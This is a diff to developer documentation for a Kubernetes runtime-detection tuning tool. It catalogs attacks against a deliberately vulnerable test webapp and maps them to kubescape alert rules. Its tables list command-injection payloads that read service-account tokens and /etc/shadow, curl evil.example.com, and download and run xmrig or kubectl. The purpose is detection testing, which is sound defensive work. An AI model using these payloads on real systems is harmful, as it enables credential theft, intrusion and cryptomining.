@@ -25,28 +25,14 @@ the Kubernetes API server service proxy — no port-forwarding needed.
 | Service | `webapp-mywebapp:8080` → container port 80 |
 | Container | `mywebapp-app` |
 | Image | `ghcr.io/k8sstormcenter/webapp` (pinned by sha256) |
+| Base OS | Debian (PHP/Apache) |
+| Tools available | `cat`, `ls`, `whoami`, `curl`, `wget`, `ping`, `php` |
 
 **Vulnerability**: Command injection via `ping.php?ip=<payload>`.
 The page runs `ping -c1 $ip` without sanitizing — semicolons chain arbitrary commands.
 
 **There is NO LFI, SSRF, or SQL injection vulnerability in this webapp.**
-
-| Attack | Payload | Detection |
-|--------|---------|-----------|
-| cmdinject-sa-token | `1.1.1.1;cat /var/run/secrets/.../token` | R0001, R0006 |
-| cmdinject-etc-passwd | `1.1.1.1;cat /etc/passwd` | R0001 |
-| cmdinject-whoami | `1.1.1.1;whoami` | R0001 |
-| cmdinject-ls-secrets | `1.1.1.1;ls /var/run/secrets/.../` | R0001 |
-
-**Expected detections** (defined in `example/webapp-attacks.yaml`):
-- R0001 "Unexpected process launched" — `cat` (container: mywebapp-app)
-- R0006 "Unexpected Service Account Token Access" — `cat` (container: mywebapp-app)
-
-**Functional tests** (`example/webapp-functional-tests.yaml`):
-- GET `/` (homepage)
-- GET `/ping.php?ip=8.8.8.8` and `1.1.1.1` (benign pings)
-- POST `/` with form data (login form)
-- exec `php -v` (check PHP version)
+All attacks are command injection + post-exploitation via the injected shell.
 
 ### Redis (CVE-2025-49844)
 
@@ -63,17 +49,134 @@ The page runs `ping -c1 $ip` without sanitizing — semicolons chain arbitrary c
 Lua sandbox escape. Exploit chain: heap spray → GC trigger → fileless execution
 via `memfd_create` + `execve`.
 
-| Attack | Type | Detection |
-|--------|------|-----------|
+## Detection Rules Reference
+
+Rules from `kubescape/default-rules.yaml`. Only rules with `isTriggerAlert: true` fire alerts.
+
+| Rule ID | Name | Triggers Alert | Profile-Dependent |
+|---------|------|:-:|:-:|
+| R0001 | Unexpected process launched | YES | YES |
+| R0002 | Files Access Anomalies in container | YES | YES |
+| R0003 | Syscalls Anomalies in container | no | YES |
+| R0004 | Linux Capabilities Anomalies in container | no | YES |
+| R0005 | DNS Anomalies in container | YES | YES |
+| R0006 | Unexpected service account token access | YES | YES |
+| R0007 | Workload uses Kubernetes API unexpectedly | no | YES |
+| R0010 | Unexpected Sensitive File Access | YES | no |
+| R0011 | Unexpected Egress Network Traffic | no | YES |
+| R1001 | Drifted process executed | YES | no |
+| R1005 | Fileless execution detected | YES | no |
+| R1007 | Crypto miner launched (RandomX) | YES | no |
+| R1008 | Crypto Mining Domain Communication | YES | no |
+| R1009 | Crypto Mining Related Port Communication | no | no |
+| R1010 | Soft link created over sensitive file | YES | no |
+
+**Profile-dependent** = rule only fires if the action is NOT in the ApplicationProfile.
+**Not profile-dependent** = rule fires regardless (e.g., R0010 always flags /etc/shadow).
+
+## Webapp Attack Catalog
+
+### Currently Implemented
+
+| Attack | Payload via ping.php | Expected Rules | Status |
+|--------|---------------------|----------------|--------|
+| cmdinject-sa-token | `;cat /var/run/secrets/.../token` | R0001, R0006 | Active |
+| cmdinject-etc-passwd | `;cat /etc/passwd` | R0001 | Active |
+| cmdinject-whoami | `;whoami` | R0001 | Active |
+| cmdinject-ls-secrets | `;ls /var/run/secrets/.../` | R0001 | Active |
+| postexploit-etc-shadow | `;cat /etc/shadow` | R0010 | Active (detection TBD) |
+| postexploit-dns-anomaly | `;curl -sm2 http://evil.example.com` | R0005 | Active (detection TBD) |
+| postexploit-drifted-binary | `;cp /bin/ls /tmp/drifted && /tmp/drifted` | R1001 | Active (detection TBD) |
+
+### Planned (not yet implemented)
+
+| Attack | Payload | Expected Rules | Node-Agent Test Reference |
+|--------|---------|----------------|--------------------------|
+| Crypto miner injection | `;curl -o /tmp/xmrig <url> && /tmp/xmrig --bench 1M` | R1007, R1001 | Test_10c |
+| Crypto mining domain | `;nslookup xmr.pool.minergate.com` | R1008 | Test_02 (malicious.go L206) |
+| Crypto mining port | `;curl telnet://xmr.pool.minergate.com:45700` | R1009 | Test_02 (malicious.go L207) |
+| Symlink exec (shm) | `;ln -s /bin/ls /dev/shm/x && /dev/shm/x` | R1010 | Test_02 (malicious.go L144) |
+| File write anomaly | `;echo pwned > /tmp/malicious.txt` | R0002 | Test_02 (malicious.go L81) |
+| Egress to unknown IP | `;curl -sm2 http://8.8.8.8` | R0011 | Test_28c |
+| DNS MITM detection | (requires CoreDNS manipulation) | R0011 | Test_28d/28e/28f |
+| Process from mount | (requires volume mount exploitation) | R1004 | Test_02 (malicious.go L186) |
+
+## Node-Agent Component Test Mapping
+
+The node-agent has 32 component tests in `node-agent/tests/component_test.go`.
+These are the tests whose attack patterns we can reuse for webapp tuning:
+
+### Test_01: BasicAlertTest — Process + DNS Detection
+- **Attacks**: `ls -l` (unexpected process), `curl ebpf.io` (DNS anomaly)
+- **Rules**: R0001, R0005
+- **Webapp reuse**: Direct — all via ping.php command injection
+
+### Test_02: AllAlertsFromMaliciousApp — Comprehensive Attack
+The "malicious.go" binary (`node-agent/tests/images/malicious-app/malicious.go`) runs:
+
+| Action | Rule | Webapp Equivalent |
+|--------|------|-------------------|
+| Download + exec kubectl | R0001, R0006, R0007 | `;curl -o /tmp/kubectl <url> && /tmp/kubectl get secrets` |
+| Open SA token file | R0006 | `;cat /var/run/secrets/.../token` |
+| Write malicious.txt | R0002 | `;echo pwned > /tmp/evil.txt` |
+| Syscall: unshare | R0003 | Not replicable via shell |
+| Bind port 80 | R0004 | Not replicable via shell |
+| Symlink /bin/ls → /dev/shm/ls + exec | R1010 | `;ln -s /bin/ls /dev/shm/x && /dev/shm/x` |
+| Copy kubectl to /podmount + exec | R1004 | Needs volume mount |
+| HTTP to google.com | R0005 | `;curl -sm2 http://google.com` |
+| TCP to mining pool :45700 | R1009 | `;curl telnet://xmr.pool.minergate.com:45700` |
+| Insmod syscall | R1002 | Not replicable via shell |
+
+### Test_10: MalwareDetectionTest — Crypto Miner
+- **10b**: Empty AP + `cat /etc/hostname` → R0001, R0002, R0003, R0004
+- **10c**: xmrig benchmark → R1007 (RandomX detection, x86_64 only)
+- **Webapp reuse**: Could inject xmrig download + execution via ping.php
+
+### Test_12: MergingProfilesTest — Profile Merge Behavior
+- **Attack**: `ls -l` in wrong container (alert), then merge profile (no alert)
+- **Rules**: R0001
+- **Webapp reuse**: Tests AllowedProcesses/PolicyByRuleId — exactly what `bobctl tune` does
+
+### Test_27: ApplicationProfileOpens — File Access Wildcards
+- **Tests**: Exact path match, ellipsis match (`/etc/⋯`), wildcard match (`/etc/*`)
+- **Rules**: R0002
+- **Webapp reuse**: `;cat /etc/hostname`, `;cat /etc/nginx/nginx.conf`, etc.
+
+### Test_28: UserDefinedNetworkNeighborhood — DNS/Egress Detection
+- **28a**: Allowed domain (no alert)
+- **28b**: Unknown domain → R0005
+- **28c**: Unknown IP → R0011
+- **28d**: DNS spoofing (MITM) → R0011
+- **28e/f**: CoreDNS poisoning → R0011 (only when TCP egress follows)
+- **Webapp reuse**: `;curl -sm2 http://evil.com`, `;nslookup evil.com`
+
+### Test_29-30: Signed Profiles
+- Tests signature verification on ApplicationProfiles
+- **Webapp reuse**: Relevant for `bobctl sign` (Phase 3)
+
+### Test_32: CollapseConfiguration CRD
+- Tests that CollapseConfiguration controls path wildcarding during learning
+- **Webapp reuse**: Exactly what `bobctl collapse` does
+
+### Not Reusable from Webapp
+
+| Test | Why |
+|------|-----|
+| Test_03-05 | Performance/memory tests |
+| Test_06-09 | Infrastructure/state machine tests |
+| Test_11 | Endpoint profiling (HTTP path patterns) |
+| Test_14-26 | Profile lifecycle, cooldown, partial AP tests |
+
+## Redis Attack Catalog
+
+| Attack | Type | Expected Rules |
+|--------|------|---------------|
 | lua-heap-spray | fileless | (preparation) |
 | lua-uaf-trigger | fileless | (preparation) |
 | cve-2025-49844-exploit | fileless | R1005 |
 
-**Expected detections** (`example/redis-attacks.yaml`):
-- R1005 "Fileless execution detected" (container: redis)
-
-**Functional tests** (`example/redis-functional-tests.yaml`):
-- PING, SET/GET, INFO, DBSIZE, EVAL, DEL (all via redis-cli exec)
+Redis has a single exploit chain targeting fileless execution. The attack
+uses RESP protocol (not HTTP), so it requires port-forwarding.
 
 ## Tuning Algorithm
 
@@ -89,7 +192,7 @@ Phase 2: FP refinement — for each FP alert, add triggering process
 2. Each iteration creates a user-defined profile `ug-<name>-iteration<N>`
 3. `containerAllowed` is NEVER set — that disables the rule entirely
 4. Only `AllowedProcesses` is used for surgical FP suppression
-5. No re-learning between iterations — just modify profile, wait 60s for cache refresh
+5. No re-learning between iterations — modify profile, wait 60s for cache refresh
 
 **Score** = MissedDetections + FalsePositives (lower is better, 0 = perfect)
 
@@ -103,11 +206,14 @@ All these files MUST be consistent with each other:
 | `example/webapp-functional-tests.yaml` | Benign traffic for webapp |
 | `example/redis-attacks.yaml` | Attacks + expected detections for redis |
 | `example/redis-functional-tests.yaml` | Benign traffic for redis |
-| `pkg/verify/types.go` `DefaultExpectedDetections()` | Hardcoded defaults (webapp only) |
+| `kubescape/default-rules.yaml` | Rule definitions (names must match alert labels) |
+| `pkg/verify/types.go` `DefaultExpectedDetections()` | Hardcoded defaults (webapp) |
 | `pkg/autotune/tuner_test.go` `testAttackSuite()` | Unit test attack suite |
 | `pkg/autotune/tuner_test.go` `expectedAttackAlerts()` | Unit test expected alerts |
 
 When you change attacks or detections, update ALL of these.
+
+**Rule name matching** uses `strings.EqualFold` (case-insensitive) in `pkg/verify/matchers.go`.
 
 ## Local Development
 
@@ -130,7 +236,7 @@ When you change attacks or detections, update ALL of these.
 ./scripts/local-ci.sh --tune-only
 ```
 
-### Setup infrastructure only (then iterate manually)
+### Setup infrastructure only
 
 ```bash
 ./scripts/local-ci.sh --setup-only
@@ -203,14 +309,7 @@ Node-agent is configured to export to `alertmanager.honey.svc.cluster.local:9093
 
 ### Default Rules
 
-`kubescape/default-rules.yaml` — key rules:
-- R0001: Unexpected process launched
-- R0002: Unexpected file access
-- R0005: Unexpected domain request
-- R0006: Unexpected SA token access
-- R1005: Fileless execution detected
-- R1007: Crypto miner launched
-- R1008: Crypto mining domain communication
+`kubescape/default-rules.yaml` — see Detection Rules Reference table above.
 
 ## CI Workflow
 
@@ -234,4 +333,5 @@ The `feature/collapse-config-crd` branch adds the CollapseConfiguration CRD type
 3. Create `example/<app>-attacks.yaml` (attacks + expected detections)
 4. Add app case to `scripts/local-ci.sh`
 5. Add matrix entry to `.github/workflows/ci-bobctl-autotune.yaml`
-6. Test: `./scripts/local-ci.sh --app <app>`
+6. Update this document with the new app's attack catalog
+7. Test: `./scripts/local-ci.sh --app <app>`
